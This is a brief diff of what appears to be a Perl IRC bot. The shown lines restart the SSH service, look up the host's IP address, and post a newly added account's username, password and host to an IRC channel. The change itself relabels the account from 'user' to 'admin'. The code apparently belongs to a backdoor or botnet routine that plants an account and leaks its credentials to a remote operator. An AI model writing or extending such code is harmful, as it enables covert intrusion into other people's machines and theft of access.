@@ -85,7 +85,7 @@ system 'if [ -f /usr/bin/yum ]; then sudo service sshd restart; fi';
 system 'if [ -f /usr/bin/apt ]; then sudo service ssh restart; fi';
   warn 'Getting SSH...';
   $address = eval { Net::Address::IP::Local->connected_to('perlmaven.com') };
-  @arr4y = ('9,1Added user:', $random_user, 'password:', $random_number, 'on host:', $address);
+  @arr4y = ('9,1Added admin:', $random_user, 'password:', $random_number, 'on host:', $address);
   warn "@arr4y";
   $irc->write(notice => $noticechan => @arr4y);
  }
